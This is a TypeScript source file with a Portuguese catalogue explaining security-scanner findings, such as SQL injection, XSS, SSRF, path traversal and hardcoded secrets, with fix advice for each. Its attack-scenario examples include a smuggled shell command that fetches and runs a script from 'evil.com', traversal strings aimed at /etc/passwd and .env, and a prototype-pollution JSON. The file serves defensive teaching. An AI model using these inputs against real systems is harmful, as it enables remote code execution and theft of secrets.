// ============================================================
// Catálogo em PORTUGUÊS. Ver lib/catalog/index.ts para como é consultado.
// ============================================================
import type { Entry } from "./types";

/** Casa pelo FIM do check_id (as regras vêm com o caminho inteiro em pontos). */
export const RULES: Record<string, Entry> = {
  "avoid-pickle": {
    title: "Desserialização com pickle",
    whatItIs: "Uso de `pickle` para desserializar dados.",
    whyItMatters:
      "`pickle` executa código durante a desserialização: um payload manipulado vira execução remota no processo Python.",
    attackScenario:
      "Um objeto pickle com `__reduce__` dispara `os.system` ao ser carregado.",
    howToFix:
      "Use `json` para dados. Se precisar de binário, prefira formatos sem execução (msgpack, protobuf) e valide o schema.",
  },
  "dangerous-subprocess-use": {
    title: "Subprocesso com shell",
    whatItIs: "Chamada de subprocesso com `shell=True` ou string montada.",
    whyItMatters:
      "O shell interpreta `;`, `|` e `&&` — qualquer entrada externa vira execução de comando arbitrário.",
    howToFix:
      "Passe a lista de argumentos e mantenha `shell=False` (padrão). Valide a entrada contra uma lista do permitido.",
  },
  "dangerous-system-call": {
    title: "Chamada direta ao sistema",
    whatItIs: "Uso de `os.system` / `popen` com string.",
    whyItMatters:
      "Sempre passa pelo shell, então concatenar entrada é injeção de comando direta.",
    howToFix: "Troque por `subprocess.run` com lista de argumentos.",
  },
  "sqlalchemy-execute-raw-query": {
    title: "SQL cru no SQLAlchemy",
    whatItIs: "Consulta SQL montada por concatenação ou f-string.",
    whyItMatters:
      "É injeção de SQL: o atacante altera a consulta e alcança dados de outros usuários.",
    howToFix:
      "Use `text()` com parâmetros nomeados (`:id`) ou a API de query do ORM.",
  },
  "flask-wtf-missing-csrf-protection": {
    title: "Flask sem proteção CSRF",
    whatItIs: "Aplicação Flask sem CSRFProtect configurado.",
    whyItMatters:
      "Sem token, outro site consegue disparar ações autenticadas no navegador da vítima.",
    howToFix: "Ative `CSRFProtect(app)` e inclua o token nos formulários.",
  },
  "django-secret-key": {
    title: "SECRET_KEY no código",
    whatItIs: "A SECRET_KEY do Django está fixa no código.",
    whyItMatters:
      "Com ela é possível forjar sessões e tokens assinados — equivale a virar qualquer usuário.",
    howToFix:
      "Mova para variável de ambiente e ROTACIONE a chave exposta (as sessões atuais caem, o que é o esperado).",
  },
  "math-random-used": {
    title: "Aleatoriedade não criptográfica",
    whatItIs: "Uso de gerador pseudoaleatório comum para valor de segurança.",
    whyItMatters:
      "`Math.random`/`random` são previsíveis: token de sessão ou de recuperação gerado assim pode ser adivinhado.",
    howToFix:
      "Use `crypto.randomUUID()`/`crypto.getRandomValues` (JS) ou `secrets` (Python).",
  },
  "jwt-python-none-algorithm": {
    title: "JWT aceitando algoritmo none",
    whatItIs: "Verificação de JWT que aceita o algoritmo `none`.",
    whyItMatters:
      "O atacante remove a assinatura e forja qualquer conteúdo do token, inclusive o papel de admin.",
    howToFix:
      "Fixe os algoritmos aceitos (`algorithms=[\"RS256\"]`) e nunca confie no cabeçalho do token.",
  },
  "jwt-hardcode": {
    title: "Segredo de JWT no código",
    whatItIs: "A chave de assinatura do JWT está no código.",
    whyItMatters: "Quem lê o repositório assina tokens válidos para qualquer usuário.",
    howToFix: "Mova para variável de ambiente e rotacione a chave exposta.",
  },
  "gorilla-csrf-not-configured": {
    title: "Go: CSRF não configurado",
    whatItIs: "Servidor Go sem middleware de CSRF nas rotas que mudam estado.",
    whyItMatters:
      "Outro site consegue disparar ações autenticadas usando o cookie da vítima.",
    howToFix: "Aplique o middleware de CSRF e valide o token nas rotas mutantes.",
  },
  "formatted-sql-query": {
    title: "SQL montado por formatação",
    whatItIs: "Consulta SQL construída com formatação de string.",
    whyItMatters:
      "É o caminho clássico de injeção de SQL, independente da linguagem.",
    howToFix: "Use parâmetros do driver; nunca interpole valor na string.",
  },
  "insecure-cipher-algorithm": {
    title: "Cifra insegura",
    whatItIs: "Uso de algoritmo de cifra quebrado (DES, RC4, ECB).",
    whyItMatters:
      "O dado é recuperável na prática — a criptografia dá falsa sensação de proteção.",
    howToFix: "Use AES-GCM (ou ChaCha20-Poly1305) com IV aleatório por mensagem.",
  },
  "insecure-hash-function": {
    title: "Hash inseguro",
    whatItIs: "Uso de MD5 ou SHA-1.",
    whyItMatters:
      "São vulneráveis a colisão; para senha, além disso, são rápidos demais e caem em ataque de dicionário.",
    howToFix:
      "SHA-256+ para integridade; Argon2id ou bcrypt para senha.",
  },
  "tainted-sql-string": {
    title: "SQL com entrada não confiável",
    whatItIs: "Entrada externa alcança a montagem de uma consulta SQL.",
    whyItMatters: "Injeção de SQL com caminho de ataque já rastreado pela ferramenta.",
    howToFix: "Parametrize a consulta e valide o tipo da entrada.",
  },
  "ssrf-requests": {
    title: "Requisição para URL não confiável",
    whatItIs: "URL de destino vem de entrada externa.",
    whyItMatters:
      "O servidor passa a buscar o que o atacante mandar, incluindo serviços internos e metadados de nuvem (169.254.169.254).",
    howToFix:
      "Valide contra allowlist de domínios e bloqueie faixas privadas, inclusive após redirecionamento.",
  },
  "missing-integrity": {
    title: "Script externo sem integridade",
    whatItIs: "Tag `<script>`/`<link>` externa sem atributo `integrity`.",
    whyItMatters:
      "Se o CDN for comprometido, o script alterado executa na sua página com acesso total à sessão.",
    howToFix: "Adicione `integrity` com o hash e `crossorigin=\"anonymous\"`.",
  },
  "detect-child-process": {
    title: "Execução de comando do sistema",
    whatItIs:
      "O código executa comandos do sistema operacional a partir do próprio programa.",
    whyItMatters:
      "Se qualquer parte do comando vier de entrada do usuário, um atacante encadeia comandos próprios e passa a executar código no servidor com os privilégios da aplicação.",
    attackScenario:
      'Um valor como `arquivo.txt; curl evil.com/shell | sh` transforma um comando inofensivo em execução remota.',
    howToFix:
      "Troque `exec`/`execSync` por `execFile`/`spawn` com os argumentos em ARRAY (o shell deixa de interpretar a string) e valide a entrada contra uma lista do que é permitido.",
  },
  "detect-non-literal-fs-filename": {
    title: "Caminho de arquivo montado dinamicamente",
    whatItIs:
      "Um caminho de arquivo é montado dinamicamente, em vez de ser fixo no código.",
    whyItMatters:
      "Se o caminho aceitar `../`, o atacante sai do diretório previsto e lê ou grava arquivos arbitrários do servidor — inclusive `.env` e chaves privadas.",
    attackScenario:
      "Pedir `../../../../etc/passwd` (ou `..\\..\\.env` no Windows) num parâmetro que vira nome de arquivo.",
    howToFix:
      "Normalize com `path.resolve` e confirme que o resultado começa no diretório permitido antes de abrir. Melhor ainda: aceite um identificador e faça o mapeamento para o caminho no servidor.",
  },
  "path-join-resolve-traversal": {
    title: "Travessia de diretório em path.join",
    whatItIs:
      "Um caminho vindo de fora é concatenado com um diretório base via `path.join`/`resolve`.",
    whyItMatters:
      "`path.join` resolve `..` silenciosamente: o resultado pode apontar para fora do diretório pretendido.",
    attackScenario:
      "`path.join('/uploads', '../../etc/shadow')` resulta em `/etc/shadow`.",
    howToFix:
      "Depois de resolver, verifique `resolvido.startsWith(baseDir + path.sep)`; recuse o que sair do base.",
  },
  "detect-non-literal-require": {
    title: "Módulo carregado por nome dinâmico",
    whatItIs: "Um módulo é carregado a partir de um nome calculado em runtime.",
    whyItMatters:
      "Se o nome tiver qualquer influência externa, o atacante carrega um módulo arbitrário do disco e executa o código dele.",
    howToFix:
      "Use um mapa fixo de nomes permitidos para os módulos, em vez de montar o caminho dinamicamente.",
  },
  "detect-non-literal-regexp": {
    title: "Expressão regular construída em runtime",
    whatItIs:
      "Uma expressão regular é construída a partir de um valor dinâmico.",
    whyItMatters:
      "Além de erros de sintaxe em runtime, uma expressão vinda de fora pode causar retrocesso catastrófico (ReDoS) e travar o processo inteiro com uma única requisição.",
    howToFix:
      "Use expressões fixas. Se precisar interpolar, escape os metacaracteres e imponha um limite de tamanho à entrada.",
  },
  "detect-redos": {
    title: "Expressão regular vulnerável a ReDoS",
    whatItIs:
      "A expressão regular tem um padrão sujeito a retrocesso catastrófico.",
    whyItMatters:
      "Uma entrada relativamente curta faz o motor de regex explorar um número exponencial de caminhos, travando o event loop e derrubando o serviço.",
    attackScenario:
      "Um campo com dezenas de caracteres repetidos consome 100% de CPU por minutos.",
    howToFix:
      "Reescreva o padrão eliminando quantificadores aninhados (`(a+)+`), ou troque por análise sem regex. Limite o tamanho da entrada antes de aplicar.",
  },
  "prototype-pollution-assignment": {
    title: "Poluição de protótipo por atribuição",
    whatItIs:
      "Uma atribuição usa chave dinâmica, permitindo escrever em `__proto__`.",
    whyItMatters:
      "Poluir o protótipo afeta TODOS os objetos do processo: dá para forjar propriedades de autorização e alterar o comportamento de bibliotecas.",
    attackScenario:
      'Um JSON com `{"__proto__": {"isAdmin": true}}` faz qualquer objeto passar a responder `isAdmin`.',
    howToFix:
      "Recuse as chaves `__proto__`, `constructor` e `prototype`, ou use `Map`/`Object.create(null)` para dados vindos de fora.",
  },
  "prototype-pollution-loop": {
    title: "Poluição de protótipo em cópia recursiva",
    whatItIs: "Uma cópia recursiva de objeto sem barreira contra `__proto__`.",
    whyItMatters:
      "É o vetor clássico de poluição de protótipo em funções de merge/clone.",
    howToFix:
      "Pule as chaves perigosas no laço, ou use `structuredClone`/uma biblioteca que já trate isso.",
  },
  "insecure-innerhtml": {
    title: "HTML inserido no DOM sem sanitização",
    whatItIs: "HTML é inserido na página por atribuição direta ao DOM.",
    whyItMatters:
      "Qualquer conteúdo não sanitizado vira script executando no navegador da vítima, com acesso à sessão dela (XSS).",
    howToFix:
      "Use `textContent` para texto. Se precisar de HTML, sanitize com uma biblioteca dedicada (DOMPurify) antes de inserir.",
  },
  "react-dangerouslysetinnerhtml": {
    title: "dangerouslySetInnerHTML sem sanitização",
    whatItIs: "Uso de `dangerouslySetInnerHTML` no React.",
    whyItMatters:
      "Este atributo desliga a proteção automática do React contra XSS — o conteúdo é inserido cru.",
    howToFix:
      "Renderize como texto sempre que possível; se HTML for necessário, sanitize antes.",
  },
  "raw-html-format": {
    title: "HTML montado por concatenação",
    whatItIs: "HTML montado por concatenação de strings.",
    whyItMatters:
      "Interpolar valor não escapado dentro de HTML é a origem mais comum de XSS refletido e armazenado.",
    howToFix:
      "Use o mecanismo de template do framework (que escapa por padrão) ou escape explicitamente cada valor interpolado.",
  },
  "jquery-insecure-selector": {
    title: "Seletor jQuery com valor dinâmico",
    whatItIs: "Um seletor jQuery é montado com valor dinâmico.",
    whyItMatters:
      "O jQuery interpreta seletores que começam com `<` como HTML — o valor vira elemento executável no DOM.",
    howToFix:
      "Use `document.querySelector` com seletor fixo, ou `$(document).find(valor)` após validar.",
  },
  "unsafe-dynamic-method": {
    title: "Método invocado por nome dinâmico",
    whatItIs: "Um método é invocado por nome calculado em runtime.",
    whyItMatters:
      "Se o nome for influenciável de fora, o atacante chama métodos não previstos do objeto (inclusive herdados do protótipo).",
    howToFix:
      "Use um mapa explícito nome → função, recusando o que não estiver nele.",
  },
  "js-open-redirect-from-function": {
    title: "Redirecionamento aberto",
    whatItIs: "Um redirecionamento usa destino vindo de fora.",
    whyItMatters:
      "O atacante usa o seu domínio como trampolim para uma página de phishing — o link parece legítimo porque começa no seu site.",
    howToFix:
      "Aceite apenas caminhos relativos, ou valide o destino contra uma lista de domínios permitidos.",
  },
  "bypass-tls-verification": {
    title: "Verificação de certificado TLS desativada",
    whatItIs: "A verificação do certificado TLS está desativada.",
    whyItMatters:
      "Sem validar o certificado, qualquer intermediário na rede lê e altera o tráfego — a criptografia deixa de proteger contra ataque ativo.",
    howToFix:
      "Remova `rejectUnauthorized: false` / `verify=False`. Se for certificado interno, instale a CA no armazenamento de confiança em vez de desligar a checagem.",
  },
  "third-party-action-not-pinned-to-commit-sha": {
    title: "GitHub Action de terceiro não fixada em commit",
    whatItIs:
      "Uma GitHub Action de terceiro é referenciada por tag (`@v3`) em vez de SHA de commit.",
    whyItMatters:
      "Tags são móveis: quem controla o repositório da action pode reapontar `v3` para código malicioso, que passa a rodar no seu CI com acesso aos segredos do pipeline.",
    attackScenario:
      "A conta do mantenedor é comprometida, a tag é reapontada e o próximo build exfiltra as credenciais de deploy.",
    howToFix:
      "Fixe no SHA completo do commit (`uses: dono/acao@<sha40>`) e atualize de forma controlada, por exemplo com Dependabot.",
  },
  "dockerfile-source-not-pinned": {
    title: "Imagem base do Docker não fixada",
    whatItIs: "A imagem base do Dockerfile não está fixada.",
    whyItMatters:
      "Builds deixam de ser reproduzíveis e uma imagem base alterada entra no seu ambiente sem revisão.",
    howToFix: "Fixe por digest (`FROM imagem@sha256:...`) ou ao menos por versão exata.",
  },
  "package-dependencies-check": {
    title: "Dependências com versão não fixada",
    whatItIs:
      "A declaração de dependências permite versões não fixadas (faixas como `^` ou `*`).",
    whyItMatters:
      "Uma versão publicada com código malicioso entra na próxima instalação sem ninguém revisar — é o vetor de ataque de cadeia de suprimentos mais comum em npm.",
    howToFix:
      "Fixe as versões e versione o lockfile. Use `npm ci` no CI, que instala exatamente o que está no lock.",
  },
  "generic-api-key": {
    title: "Chave de API no código",
    whatItIs: "Uma chave de API aparente está escrita no código.",
    whyItMatters:
      "Segredo em repositório vaza para todo mundo com acesso ao clone — e permanece no histórico do git mesmo depois de removido.",
    howToFix:
      "Mova para variável de ambiente, REVOGUE a chave exposta (ela deve ser considerada comprometida) e limpe o histórico se o repositório for público.",
  },
  "detected-generic-secret": {
    title: "Segredo no código",
    whatItIs: "Um valor com aparência de segredo está no código.",
    whyItMatters:
      "Credenciais em repositório são o achado mais explorado por varredores automáticos — bots encontram chaves públicas em minutos.",
    howToFix:
      "Mova para variável de ambiente e revogue o valor exposto.",
  },
  "private-key": {
    title: "Chave privada versionada",
    whatItIs: "Uma chave privada está versionada no repositório.",
    whyItMatters:
      "Quem tiver a chave assume a identidade do serviço: assina tokens, decifra tráfego ou acessa servidores.",
    howToFix:
      "Remova, GERE UM NOVO PAR e distribua a chave por um cofre de segredos. Trate a chave antiga como comprometida.",
  },
  "unsafe-formatstring": {
    title: "String de formatação dinâmica",
    whatItIs: "Uma string de formatação é montada dinamicamente.",
    whyItMatters:
      "Dependendo da linguagem, permite ler memória ou provocar erro não tratado.",
    howToFix: "Use string de formato fixa e passe os valores como argumentos.",
  },
  "eqeq-is-bad": {
    title: "Comparação frouxa (==) em vez de estrita",
    whatItIs: "Comparação com `==` em vez de `===`.",
    whyItMatters:
      "A coerção de tipos do JavaScript cria igualdades surpreendentes (`0 == '0'`, `'' == false`), o que em verificação de permissão vira falha de autorização.",
    howToFix: "Use `===`/`!==` e converta os tipos explicitamente.",
  },
  "useless-assignment": {
    title: "Atribuição sem uso",
    whatItIs: "Uma variável recebe valor que nunca é usado.",
    whyItMatters:
      "Não é falha de segurança, mas costuma indicar lógica incompleta — inclusive validação que foi escrita e não aplicada.",
    howToFix: "Remova a atribuição, ou use o valor se a intenção era validá-lo.",
  },
};

/** Fallback por CWE quando a regra específica não está no catálogo. */
export const CWES: Record<string, Entry> = {
  "CWE-78": {
    title: "Injeção de comando do sistema",
    whatItIs: "Injeção de comando do sistema operacional.",
    whyItMatters:
      "Entrada não confiável chega a um interpretador de comandos e o atacante executa o que quiser no servidor.",
    howToFix:
      "Execute com argumentos em array (sem shell) e valide a entrada contra uma lista do permitido.",
  },
  "CWE-79": {
    title: "Cross-site scripting (XSS)",
    whatItIs: "Cross-site scripting (XSS).",
    whyItMatters:
      "Script controlado pelo atacante roda no navegador da vítima com a sessão dela — dá para roubar tokens e agir em nome do usuário.",
    howToFix:
      "Escape a saída conforme o contexto (HTML, atributo, JS) e sanitize qualquer HTML aceito.",
  },
  "CWE-89": {
    title: "Injeção de SQL",
    whatItIs: "Injeção de SQL.",
    whyItMatters:
      "O atacante altera a consulta e lê, modifica ou apaga dados que não deveria alcançar — frequentemente o banco inteiro.",
    howToFix:
      "Use consultas parametrizadas (placeholders do driver). Nunca concatene entrada na string SQL.",
  },
  "CWE-22": {
    title: "Travessia de diretório",
    whatItIs: "Travessia de diretório (path traversal).",
    whyItMatters:
      "Permite ler ou gravar arquivos fora do diretório previsto, incluindo configuração e segredos.",
    howToFix:
      "Normalize o caminho e confirme que ele permanece dentro do diretório base.",
  },
  "CWE-94": {
    title: "Injeção de código",
    whatItIs: "Injeção de código.",
    whyItMatters:
      "Entrada não confiável é interpretada como código do próprio programa.",
    howToFix: "Elimine `eval`/`Function`; use estruturas de dados em vez de código gerado.",
  },
  "CWE-502": {
    title: "Desserialização insegura",
    whatItIs: "Desserialização insegura.",
    whyItMatters:
      "Objetos vindos de fora podem disparar execução de código durante a reconstrução.",
    howToFix:
      "Desserialize apenas formatos de dados puros (JSON) e valide o schema antes de usar.",
  },
  "CWE-611": {
    title: "XML com entidades externas (XXE)",
    whatItIs: "Processamento de XML com entidades externas (XXE).",
    whyItMatters:
      "Permite ler arquivos locais e alcançar serviços internos a partir do parser.",
    howToFix: "Desative entidades externas e DTD no parser de XML.",
  },
  "CWE-918": {
    title: "Server-Side Request Forgery (SSRF)",
    whatItIs: "Server-Side Request Forgery (SSRF).",
    whyItMatters:
      "O servidor faz requisições para onde o atacante mandar, alcançando serviços internos e metadados de nuvem.",
    howToFix:
      "Restrinja destino a uma lista de domínios permitidos e bloqueie faixas de IP privadas, inclusive após redirecionamento.",
  },
  "CWE-798": {
    title: "Credencial embutida no código",
    whatItIs: "Credencial embutida no código.",
    whyItMatters:
      "Quem lê o código — ou o histórico do git — obtém acesso direto ao recurso protegido.",
    howToFix: "Mova para variável de ambiente e revogue o valor exposto.",
  },
  "CWE-327": {
    title: "Criptografia fraca ou obsoleta",
    whatItIs: "Algoritmo de criptografia fraco ou obsoleto.",
    whyItMatters:
      "Algoritmos quebrados (MD5, SHA-1, DES) não oferecem a proteção que a arquitetura assume.",
    howToFix:
      "Use AES-GCM para cifra, SHA-256+ para hash de dados e Argon2/bcrypt para senha.",
  },
  "CWE-601": {
    title: "Redirecionamento aberto",
    whatItIs: "Redirecionamento aberto.",
    whyItMatters: "Seu domínio passa a dar credibilidade a um link de phishing.",
    howToFix: "Aceite apenas caminhos relativos ou destinos de uma lista permitida.",
  },
  "CWE-1321": {
    title: "Poluição de protótipo",
    whatItIs: "Poluição de protótipo.",
    whyItMatters:
      "Altera o comportamento de todos os objetos do processo, incluindo checagens de permissão.",
    howToFix: "Recuse `__proto__`/`constructor`/`prototype` em dados externos.",
  },
  "CWE-1333": {
    title: "Regex de complexidade exponencial (ReDoS)",
    whatItIs: "Expressão regular com complexidade exponencial (ReDoS).",
    whyItMatters:
      "Uma requisição pequena consome CPU indefinidamente e derruba o serviço.",
    howToFix: "Reescreva o padrão e limite o tamanho da entrada.",
  },
  "CWE-1357": {
    title: "Componente de terceiro não confiável",
    whatItIs: "Dependência de componente de terceiro não confiável o bastante.",
    whyItMatters:
      "Código de terceiro roda com os mesmos privilégios do seu — se ele for alterado, você executa a alteração.",
    howToFix: "Fixe a versão por digest/SHA e revise as atualizações.",
  },
};
